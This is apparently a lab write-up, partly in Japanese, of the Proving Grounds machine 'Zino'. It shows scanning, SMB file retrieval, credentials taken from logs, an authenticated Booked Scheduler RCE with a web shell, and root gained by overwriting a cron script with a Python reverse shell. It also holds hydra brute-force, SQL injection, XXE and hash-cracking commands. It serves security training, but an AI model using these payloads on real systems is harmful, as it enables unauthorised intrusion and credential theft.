# Zino

| Variable          | Value        |
| ----------------- | ------------ |
| Remote IP         | 192.168.63.64  |
| Local IP          | 192.168.49.63   |
| Local listen port | 4444 |

## Port scan

### RustScan

- [x] Full TCP port scan

```bash
┌──(l3ickey👽kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Zino]
└─$ rustscan -a 192.168.63.64 --ulimit 5000 -- -sV -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/funa/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.63.64:21
Open 192.168.63.64:22
Open 192.168.63.64:139
Open 192.168.63.64:445
Open 192.168.63.64:3306
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-05 15:10 JST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:10
Completed NSE at 15:10, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:10
Completed NSE at 15:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:10
Completed NSE at 15:10, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 15:10
Completed Parallel DNS resolution of 1 host. at 15:10, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 15:10
Scanning 192.168.63.64 [5 ports]
Discovered open port 21/tcp on 192.168.63.64
Discovered open port 139/tcp on 192.168.63.64
Discovered open port 3306/tcp on 192.168.63.64
Discovered open port 22/tcp on 192.168.63.64
Discovered open port 445/tcp on 192.168.63.64
Completed Connect Scan at 15:10, 0.24s elapsed (5 total ports)
Initiating Service scan at 15:10
Scanning 5 services on 192.168.63.64
Completed Service scan at 15:11, 14.84s elapsed (5 services on 1 host)
NSE: Script scanning 192.168.63.64.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:11
NSE Timing: About 99.85% done; ETC: 15:11 (0:00:00 remaining)
Completed NSE at 15:11, 40.10s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:11
Completed NSE at 15:11, 3.27s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:11
Completed NSE at 15:11, 0.00s elapsed
Nmap scan report for 192.168.63.64
Host is up, received user-set (0.25s latency).
Scanned at 2022-06-05 15:10:50 JST for 58s

PORT     STATE SERVICE     REASON  VERSION
21/tcp   open  ftp         syn-ack vsftpd 3.0.3
22/tcp   open  ssh         syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 b2:66:75:50:1b:18:f5:e9:9f:db:2c:d4:e3:95:7a:44 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC44YysvRUv+02vB7LK+DbEvDnTUU2Zzaj42pbyX7gL4I5DhhWWZmK4Sr/MulEE2XPnKhXCCwTVuA12C/VuFhVdnq7WjDwfV+4a1DEuDG8P7wQAux0waAsly34mGtd7HQhQIv9h7nQWcTx8hoOrF6D71eHiZmLJ6fk01VlFN75XKJGn/T/ClJHz9UJ33zwkhqXskMO9At21LfOBE+I3IQCHuFFO6DcQWw/SsZaXQxHNzLqnI/9j1aQuvyuh6KMdT6p10D577maBz+T+Hyq/qeOgbGU0YGAoXXMU36FibkoQ+WwDRYbEHYKJccUXhzFWp980PYCIDtZNaWuo/AbgryLB
|   256 91:2d:26:f1:ba:af:d1:8b:69:8f:81:4a:32:af:9c:77 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOmcORNC6GjDnH1cqJrCeytZJjGrpJyY+CgseFsH27PJmSbmVYEz0ls0w/oXR0xrG/IfvxxyH9RRX2BIsBTx2cY=
|   256 ec:6f:df:8b:ce:19:13:8a:52:57:3e:72:a3:14:6f:40 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP9wfKL6wusRXGDMv5Tcf2OxMAIkhvOofRPsrSQ+aMbK
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql?      syn-ack
| fingerprint-strings:
|   GenericLines, HTTPOptions, Help, JavaRMI, LANDesk-RC, NCP, NULL, NotesRPC, SIPOptions, WMSRequest, ms-sql-s, oracle-tns:
|_    Host '192.168.49.63' is not allowed to connect to this MariaDB server
| mysql-info:
|_  MySQL Error: Host '192.168.49.63' is not allowed to connect to this MariaDB server
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.92%I=7%D=6/5%Time=629C48EA%P=x86_64-pc-linux-gnu%r(NUL
SF:L,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.63'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GenericLine
SF:s,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.63'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(HTTPOptions
SF:,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.63'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Help,4C,"H\0
SF:\0\x01\xffj\x04Host\x20'192\.168\.49\.63'\x20is\x20not\x20allowed\x20to
SF:\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SIPOptions,4C,"H\0\0
SF:\x01\xffj\x04Host\x20'192\.168\.49\.63'\x20is\x20not\x20allowed\x20to\x
SF:20connect\x20to\x20this\x20MariaDB\x20server")%r(LANDesk-RC,4C,"H\0\0\x
SF:01\xffj\x04Host\x20'192\.168\.49\.63'\x20is\x20not\x20allowed\x20to\x20
SF:connect\x20to\x20this\x20MariaDB\x20server")%r(NCP,4C,"H\0\0\x01\xffj\x
SF:04Host\x20'192\.168\.49\.63'\x20is\x20not\x20allowed\x20to\x20connect\x
SF:20to\x20this\x20MariaDB\x20server")%r(NotesRPC,4C,"H\0\0\x01\xffj\x04Ho
SF:st\x20'192\.168\.49\.63'\x20is\x20not\x20allowed\x20to\x20connect\x20to
SF:\x20this\x20MariaDB\x20server")%r(JavaRMI,4C,"H\0\0\x01\xffj\x04Host\x2
SF:0'192\.168\.49\.63'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20t
SF:his\x20MariaDB\x20server")%r(WMSRequest,4C,"H\0\0\x01\xffj\x04Host\x20'
SF:192\.168\.49\.63'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20thi
SF:s\x20MariaDB\x20server")%r(oracle-tns,4C,"H\0\0\x01\xffj\x04Host\x20'19
SF:2\.168\.49\.63'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\
SF:x20MariaDB\x20server")%r(ms-sql-s,4C,"H\0\0\x01\xffj\x04Host\x20'192\.1
SF:68\.49\.63'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20M
SF:ariaDB\x20server");
Service Info: Host: ZINO; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2022-06-05T06:11:10
|_  start_date: N/A
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: zino
|   NetBIOS computer name: ZINO\x00
|   Domain name: \x00
|   FQDN: zino
|_  System time: 2022-06-05T02:11:07-04:00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 31200/tcp): CLEAN (Timeout)
|   Check 2 (port 44980/tcp): CLEAN (Timeout)
|   Check 3 (port 37220/udp): CLEAN (Timeout)
|   Check 4 (port 58304/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:11
Completed NSE at 15:11, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:11
Completed NSE at 15:11, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:11
Completed NSE at 15:11, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.74 seconds

```

### Nmap

- [x] Well-known UDP port scan

```bash
┌──(l3ickey🎃kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Zino]
└─$ sudo nmap -Pn -sU --min-rate=10000 192.168.63.64
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-05 15:09 JST
Nmap scan report for 192.168.63.64
Host is up.
All 1000 scanned ports on 192.168.63.64 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 2.22 seconds

```

## TCP

### FTP - 21

| software name | version | vulnerability |
| ------------- | ------- | ------------- |
| vsftpd        | 3.0.3   | none          |

- [x] Anonymous login

  - [x] `anonymous:`

  ```bash
  ftp anonymous@192.168.63.64 21
  ```

  - [x] `anonymous:anonymous`

  ```bash
  ftp anonymous@192.168.63.64 21
  ```

  - [x] `ftp:ftp`

  ```bash
  ftp ftp@192.168.63.64 21
  ```

- [ ] Brute-force attack

  - [x] default credentials

  ```bash
  ┌──(l3ickey👽kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Zino]
  └─$ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.63.64 -V -f -t 60
  <snip>
  1 of 1 target completed, 0 valid password found
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-05 15:18:19
  
  ```

  - [ ] passwords list

    - [x] peter

    ```bash
    hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ftp://192.168.63.64 -V -f -t 60
    ```

  | wordlist path                                      | description                                               | lines       |
  | -------------------------------------------------- | --------------------------------------------------------- | ----------- |
  | /usr/share/wordlists/metasploit/unix_passwords.txt | none                                                      | 1,009       |
  | /usr/share/john/password.lst                       | most commonly seen on a set of Unix systems in mid-1990's | 3,559       |
  | /usr/share/wordlists/rockyou.txt                   | list published when the company RockYou was hacked        | 143,443,392 |

- [ ] Check joe account login

  - [ ] `joe:joe`

  ```bash
  ftp joe@192.168.63.64 21
  ```

### SSH - 22

| software name | version                                | vulnerability |
| ------------- | -------------------------------------- | ------------- |
| OpenSSH       | 7.9p1 Debian 10+deb10u2 (protocol 2.0) | none          |

- [ ] Brute-force attack

  - [x] default credentials

  ```bash
  ┌──(l3ickey👽kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Zino]
  └─$ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://192.168.63.64:22 -V -f -t 60
  <snip>
  1 of 1 target completed, 0 valid password found
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-05 15:18:24
  
  ```

  - [ ] passwords list

    - [x] peter

    ```bash
    hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.63.64:22 -V -f -t 60
    ```

  | wordlist path                                      | description                                               | lines       |
  | -------------------------------------------------- | --------------------------------------------------------- | ----------- |
  | /usr/share/wordlists/metasploit/unix_passwords.txt | none                                                      | 1,009       |
  | /usr/share/john/password.lst                       | most commonly seen on a set of Unix systems in mid-1990's | 3,559       |
  | /usr/share/wordlists/rockyou.txt                   | list published when the company RockYou was hacked        | 143,443,392 |

- [ ] Check joe account login

  - [ ] `joe:joe`

  ```bash
  ssh joe@192.168.63.64 -p 22
  ```

  If `no matching host key type found` error occurs with this command, try the following.

  ```bash
  ssh -oHostKeyAlgorithms=+ssh-dss username@192.168.63.64
  ```

  ```bash
  ssh -oHostKeyAlgorithms=+ssh-rsa username@192.168.63.64
  ```

### SMB - 139, 445

| software name | version                             | vulnerability |
| ------------- | ----------------------------------- | ------------- |
| Samba smbd    | 3.X - 4.X (workgroup: WORKGROUP)    |               |
| Samba smbd    | 4.9.5-Debian (workgroup: WORKGROUP) | none          |

- [x] List shared folders

  - [x] zino

  ```bash
  ┌──(l3ickey👽kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Zino]
  └─$ smbclient \\\\192.168.63.64\\zino -p 445 -U Administrator
  Password for [WORKGROUP\Administrator]:
  Try "help" to get a list of possible commands.
  smb: \> ls
    .                                   D        0  Fri Jul 10 04:11:49 2020
    ..                                  D        0  Tue Apr 28 22:38:53 2020
    .bash_history                       H        0  Wed Apr 29 00:35:28 2020
    error.log                           N      265  Tue Apr 28 23:07:32 2020
    .bash_logout                        H      220  Tue Apr 28 22:38:53 2020
    local.txt                           N       33  Sun Jun  5 15:08:26 2022
    .bashrc                             H     3526  Tue Apr 28 22:38:53 2020
    .gnupg                             DH        0  Tue Apr 28 23:17:02 2020
    .profile                            H      807  Tue Apr 28 22:38:53 2020
    misc.log                            N      424  Tue Apr 28 23:08:15 2020
    auth.log                            N      368  Tue Apr 28 23:07:54 2020
    access.log                          N     5464  Tue Apr 28 23:07:09 2020
    ftp                                 D        0  Tue Apr 28 23:12:56 2020
  
                  7158264 blocks of size 1024. 4726612 blocks available
  smb: \> get local.txt
  getting file \local.txt of size 33 as local.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
  
  ```

  `local.txt` を手に入れることができた．

  `zino` にある全てのファイルをダウンロードする．

  ```bash
  smb: \> mask ""
  smb: \> recurse
  smb: \> prompt
  smb: \> mget *
  NT_STATUS_ACCESS_DENIED opening remote file \.bash_history
  getting file \error.log of size 265 as error.log (0.3 KiloBytes/sec) (average 0.1 KiloBytes/sec)
  getting file \.bash_logout of size 220 as .bash_logout (0.2 KiloBytes/sec) (average 0.1 KiloBytes/sec)
  getting file \local.txt of size 33 as local.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)
  getting file \.bashrc of size 3526 as .bashrc (3.5 KiloBytes/sec) (average 0.6 KiloBytes/sec)
  getting file \.profile of size 807 as .profile (0.8 KiloBytes/sec) (average 0.6 KiloBytes/sec)
  getting file \misc.log of size 424 as misc.log (0.4 KiloBytes/sec) (average 0.6 KiloBytes/sec)
  getting file \auth.log of size 368 as auth.log (0.4 KiloBytes/sec) (average 0.6 KiloBytes/sec)
  getting file \access.log of size 5464 as access.log (5.4 KiloBytes/sec) (average 1.0 KiloBytes/sec)
  NT_STATUS_ACCESS_DENIED listing \.gnupg\*
  
  ```

  - [ ] print$
  - [ ] IPC$

```bash
┌──(l3ickey👽kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Zino]
└─$ smbclient -L 192.168.63.64 -p 445
Password for [WORKGROUP\Administrator]:

        Sharename       Type      Comment
        ---------       ----      -------
        zino            Disk      Logs
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP

```

- [ ] Check joe account login

  - [ ] `joe:joe`

  ```bash
  smbclient -L 192.168.188.125 -p 445 -U joe
  ```

### MySQL - 3306

| software name | version | vulnerability |
| ------------- | ------- | ------------- |
| mysql?        |         |               |

### HTTP - 8003

| software name    | version | vulnerability                                                |
| ---------------- | ------- | ------------------------------------------------------------ |
| Booked Scheduler | v2.7.5  | [Booked Scheduler 2.7.5 - RCE (Authenticated)](https://www.exploit-db.com/exploits/50594) |
|                  |         |                                                              |
|                  |         |                                                              |

手に入れた `access.log` を確認すると，`8003` ポートにアクセスしているログが見つかる．

```bash
┌──(l3ickey👽kali)-[~/…/pentest-cheat-sheet/offsec-pg/Zino/zino]
└─$ cat access.log
<snip>
192.168.234.30 - - [28/Apr/2020:08:26:17 -0400] "GET /booked/Web/scripts/resourcePopup.js?v=2.7.5 HTTP/1.1" 200 1618 "http://192.168.234.130:8003/booked/Web/dashboard.php" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:17 -0400] "GET /booked/Web/scripts/ajax-helpers.js?v=2.7.5 HTTP/1.1" 200 2332 "http://192.168.234.130:8003/booked/Web/dashboard.php" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"
192.168.234.30 - - [28/Apr/2020:08:26:17 -0400] "GET /booked/Web/img/booked.png?2.7.5 HTTP/1.1" 304 181 "http://192.168.234.130:8003/booked/Web/dashboard.php" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"

```

#### Enumeration

- [ ] Directory buster

  - [ ] /booked/Web/index.php

  ブラウザでアクセスすると，`booked` というページが表示される．

  ![image-20220605160425444](/home/funa/.config/Typora/typora-user-images/image-20220605160425444.png)

  フッターに `Booked Scheduler v2.7.5` というバージョン情報が書かれている．

  バージョンで脆弱性を検索すると，認証済みの RCE が見つかるので認証情報を手に入れる．

  `auth.log` を確認すると，`peter` というユーザが作成され `chauthtok` というパスワードが設定されていることがわかる．

  ```bash
  ┌──(l3ickey👽kali)-[~/…/pentest-cheat-sheet/offsec-pg/Zino/zino]
  └─$ cat auth.log
  Apr 28 08:16:54 zino groupadd[1044]: new group: name=peter, GID=1001
  Apr 28 08:16:54 zino useradd[1048]: new user: name=peter, UID=1001, GID=1001, home=/home/peter, shell=/bin/bash
  Apr 28 08:17:01 zino passwd[1056]: pam_unix(passwd:chauthtok): password changed for peter
  Apr 28 08:17:01 zino CRON[1058]: pam_unix(cron:session): session opened for user root by (uid=0)
  
  ```

  `booked`, `ssh`, `ftp` でログインを試みたが，どれも失敗した．

  `misc.log` を確認すると，`admin:adminadmin` でユーザが設定されていることがわかる．

  ```bash
  ┌──(l3ickey👽kali)-[~/…/pentest-cheat-sheet/offsec-pg/Zino/zino]
  └─$ cat misc.log
  Apr 28 08:39:01 zino systemd[1]: Starting Clean php session files...
  Apr 28 08:39:01 zino CRON[2791]: (CRON) info (No MTA installed, discarding output)
  Apr 28 08:39:01 zino systemd[1]: phpsessionclean.service: Succeeded.
  Apr 28 08:39:01 zino systemd[1]: Started Clean php session files.
  Apr 28 08:39:01 zino systemd[1]: Set application username "admin"
  Apr 28 08:39:01 zino systemd[1]: Set application password "adminadmin"
  
  ```

  ダッシュボードにログインすることができた．

  ![image-20220605163531040](/home/funa/.config/Typora/typora-user-images/image-20220605163531040.png)

  [Booked Scheduler 2.7.5 - RCE (Authenticated)](https://www.exploit-db.com/exploits/50594) を試してみると，`www-data` のシェルを手に入れることができた．

  ```bash
  ┌──(l3ickey👽kali)-[~/l3ickey/pentest-cheat-sheet/offsec-pg/Zino]
  └─$ python3 50594.py http://192.168.63.64:8003 admin adminadmin
  [+] Logged in successfully.
  [+] Uploaded shell successfully
  [+] http://192.168.63.64:8003/booked/Web/custom-favicon.php?cmd=
  
  $ id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  
  ```

  

  - [ ] /


```bash
gobuster dir -f -u http://{REMOTE_IP}:80/ -w /usr/share/wordlists/dirb/common.txt
```

If the web server we are attacking is configured to always respond with a 200 response code, try the following.

```bash
gobuster dir -f -u http://{REMOTE_IP}:80/ -w /usr/share/wordlists/dirb/common.txt -b "200"
```

| wordlist path                                               | description                        | lines  |
| ----------------------------------------------------------- | ---------------------------------- | ------ |
| /usr/share/wordlists/dirb/common.txt                        | default wordlist for dirb          | 4,614  |
| /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt | priority order case sensitive list | 87,664 |

- [ ] Read the page source
- [ ] Check the cookie

#### Login brute force

- [ ] Default credentials

  - [ ] admin:admin
  - [ ] admin:password
  - [ ] administrator:administrator
  - [ ] administrator:password
  - [ ] root:root
  - [ ] root:password

- [ ] [Most common passwords](https://cybernews.com/best-password-managers/most-common-passwords/)

  - [ ] 123456
  - [ ] 123456789
  - [ ] qwerty

- [ ] Basic Authentication

  - [ ] default credentials

  ```bash
  hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -s 80 -f {REMOTE_IP} http-get /
  ```

  - [ ] passwords list

    - [ ] username

    ```bash
    hydra -L username.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt -s 80 -f {REMOTE_IP} http-get /
    ```

  | wordlist path                                      | description                                               | lines       |
  | -------------------------------------------------- | --------------------------------------------------------- | ----------- |
  | /usr/share/wordlists/metasploit/unix_passwords.txt | none                                                      | 1,009       |
  | /usr/share/john/password.lst                       | most commonly seen on a set of Unix systems in mid-1990's | 3,559       |
  | /usr/share/wordlists/rockyou.txt                   | list published when the company RockYou was hacked        | 143,443,392 |

#### SQL

- [ ] [SQL Injection](https://github.com/mrsuman2002/SQL-Injection-Authentication-Bypass-Cheat-Sheet/blob/master/SQL%20Injection%20Cheat%20Sheet.txt)
  - [ ] admin' or '1'='1
  - [ ] admin" or "1"="1
  - [ ] admin") or ("1"="1

#### PHP

- [ ] PHP strcmp() function

We can send an empty array instead of a string as the value of the password (https://example.com/login.php/?username=admin&password[]=) and bypass authentication check.

```BurpSuite
POST /admin/index.php?login=1 HTTP/1.1
<snip>
username=admin&password[]=
```

#### XML

- [ ] [XML External Entity](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

```BurpSuite
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

#### Hash crack

- [ ] /etc/.shadow

```bash
$ cat hash.txt
joe:$6$2/SxUdFc$Es9XfSBlKCG8fadku1zyt/HPTYz3Rj7m4bRzovjHxX4WmIMO7rz4j/auR/V.yCPy2MKBLBahX29Y3DWkR6oT..:18395:0:99999:7:::
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```bash
john --show hash.txt
```

## Linux Privilege Escalation

- [x] Enumerate SUDO binaries

```bash
$ sudo -l
```

- [x] Find SUID binaries

```bash
$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chsh
/usr/bin/mount
/usr/bin/newgrp

```

If the owner of the binary is `root`, check [GTFOBins](https://gtfobins.github.io/).

- [x] Find files owned by any group

```bash
$ find / -group any_group -type f 2>/dev/null
```

- [ ] Check the `.htpasswd` credentials

```bash
$ pwd
/var/www/html
$ ls -a
.htaccess	.htpasswd
$ cat .htpasswd
username:password
```

- [x] Check the network connections

```bash
$ netstat -tlpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::445                  :::*                    LISTEN      -
tcp6       0      0 :::8003                 :::*                    LISTEN      -
tcp6       0      0 :::139                  :::*                    LISTEN      -

```

If the owner of the process is `root`, search prvesc.

- [ ] Enumerate scheduled jobs

  - [x] cron job

  `/etc/crontab` を見ると，`/var/www/html/booked/cleanup.py` が 3 分毎に実行されていることがわかる．

  ```bash
  $ cat /etc/crontab
  # /etc/crontab: system-wide crontab
  # Unlike any other crontab you don't have to run the `crontab'
  # command to install the new version when you edit this file
  # and files in /etc/cron.d. These files also have username fields,
  # that none of the other crontabs do.
  
  SHELL=/bin/sh
  PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
  
  # Example of job definition:
  # .---------------- minute (0 - 59)
  # |  .------------- hour (0 - 23)
  # |  |  .---------- day of month (1 - 31)
  # |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
  # |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
  # |  |  |  |  |
  # *  *  *  *  * user-name command to be executed
  17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
  25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
  47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
  52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
  */3 *   * * *   root    python /var/www/html/booked/cleanup.py
  #
  
  ```

  `cleanup.py` に書き込み権限が付いているので，リバースシェルを書き込む．この際 `"` をエスケープする必要があるので注意．

  ```bash
  $ pwd
  /var/www/html/booked/Web
  
  $ ls -la ../cleanup.py
  -rwxrwxrwx 1 www-data www-data 164 Apr 28  2020 ../cleanup.py
  
  $ cat ../cleanup.py
  #!/usr/bin/env python
  import os
  import sys
  try:
          os.system('rm -r /var/www/html/booked/uploads/reservation/* ')
  except:
          print 'ERROR...'
  sys.exit(0)
  
  $ echo "" > ../cleanup.py
  
  $ echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.63\",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")" > ../cleanup.py
  
  $ cat ../cleanup.py
  import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.63",8003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
  
  ```

  `nc` でリバースシェルを待ち受ける．

  ```bash
  ┌──(l3ickey🎃kali)-[~/…/pentest-cheat-sheet/offsec-pg/Zino/zino]
  └─$ nc -lnvp 8003
  listening on [any] 8003 ...
  connect to [192.168.49.63] from (UNKNOWN) [192.168.63.64] 56714
  # id
  id
  uid=0(root) gid=0(root) groups=0(root)
  # pwd
  pwd
  /root
  # ls
  ls
  proof.txt
  # cat proof.txt
  cat proof.txt
  5dd4d9015fc3f8ada6ea8e3fd21c615c
  
  ```

  `proof.txt` を手に入れることができた．

  - [ ] [pspy](https://github.com/DominicBreuker/pspy)

  ```bash local
  cd /opt/pentest-tools
  python3 -m http.server 8000
  ```

  ```bash remote
  wget http://192.168.49.63:8000/pspy64
  chmod +x pspy64
  ./pspy64
  ```

- [ ] Check [PayloadsAllTheThings Linux - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

## When you are stuck

- [ ] Are there any areas where you are guessing "it would be ____" without examining the details?

- [ ] Have you tried "all" the information available on the internet? 

